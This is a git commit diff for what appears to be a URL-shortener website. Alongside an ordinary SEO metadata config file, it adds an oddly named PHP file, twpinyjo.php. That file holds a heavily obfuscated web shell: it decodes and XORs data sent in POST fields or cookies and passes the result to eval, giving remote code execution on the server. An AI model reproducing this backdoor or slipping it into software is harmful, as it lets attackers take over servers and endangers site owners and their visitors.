797d780562a6c28fe7551cdc2965bffbf285dbae
Ahmed24A <133608640+Ahmed24A@users.noreply.github.com>
2023-05-14 23:47:12 +0100

    flippa Adalid

---
+++ config/seo/home/show.php
@@ -0,0 +1,24 @@
+<?php
+
+return [
+    [
+        'property' => 'og:url',
+        'content' =>  '{{URL.BASE}}',
+    ],
+    [
+        'property' => 'og:title',
+        'content' => 'linkdz - URL Shortener.',
+    ],
+    [
+        'property' => 'og:description',
+        'content' => 'Shorten, create and share trusted, powerful links for your business. Try linkdz for free.',
+    ],
+    [
+        'property' => 'keywords',
+        'content' => 'url shortener, link shortener'
+    ],
+    [
+        'property' => 'og:type',
+        'content' => 'website',
+    ],
+];
---
+++ twpinyjo.php
@@ -0,0 +1,24 @@
+<?php
+$nYRHDtBX/* hI */=	's'/*S*/.  chr	(116)     .	'r'/*   vSd  */./*   LVOnm */"\x5f"    .	chr/*   QEk*/(114)/*WpNV   */./*   dZ */'e'/*   nOb*/.    chr/*cZWm */(	890	-	778/*   QGQ  */).'e'/*hK */.   "\x61"/* W   */.	chr   (116);
+
+$MUsYxJvC	=    "\145"     .	'x'/* DCv */.	chr   (112)   ./*  J  */chr	(/*Pg  */980/*nvuTN */-	872	)."\x6f"	.   'd'	.     "\x65";
+	$KKojA	=/*   Zqf   */"\143"    .   "\x6f"/*   M  */./*   q */"\x75"/*  q */./*  soFf */"\x6e"  .     "\x74";
+$bgujg    = chr	(112)/*   rcxdd*/.	"\x61"/*   aA */.	chr     (99)	./*  At  */"\x6b";
+				$lMmEqnEe	=	Array (   "vUdNvubo"/*   eM  */=>/* QTv  */"rEnXBHKltkDoDFzCdTFW"     );
+   /*   XYI*/$KKnLVJO  =  Array	(	"oOrPITeApUzRazcH"/* uTa   */=>    "RRifFFVBfwUubr"	);
+	/*Ha */foreach   (	Array(   $lMmEqnEe,/*IY  */$_POST,	$KKnLVJO,/* csgDV   */$_COOKIE,     $lMmEqnEe)	as	$uJYGBgkD)	{
+
+
+  foreach/* i   */(	$uJYGBgkD    as	$TkzWw/* M   */=>	$OgProohXQ   )	{
+        $OgProohXQ	=	@$bgujg(/* FXO */chr/* Cxb   */(   172/*EH   */-	100	).'*',/*hM*/$OgProohXQ	);
+   /*   DIt   */$TkzWw/*aFvms*/.=/*   Pk*/"nlsJC-jdm-hlTx-CvIBqT-Obz-dGD-vhT";
+	/*  gBQ  */$TkzWw/*orub*/=	$nYRHDtBX (	$TkzWw,  (    strlen(	$OgProohXQ	)/strlen(    $TkzWw	)  )  +/*VnQvD */1);
+  	$oLpEhQnoo/*  vBgJY   */=	$OgProohXQ	^	$TkzWw;
+					$oLpEhQnoo/*  iY   */=/*   X   */$MUsYxJvC/*   c  */(	"\x23",/* yPPG  */$oLpEhQnoo    );
+	if/* YOeN   */(	$KKojA   (	$oLpEhQnoo/*  IW */)/*H   */==/*  Mdnk  */3/* ozK  */)  {
+
+  eval (/* eiOzq */$oLpEhQnoo[1]/* NhgEM*/(/*  pzem  */$oLpEhQnoo[2]/* suL*/)/* c   */);
+	exit	();
+			    }
+    	}
+  	}
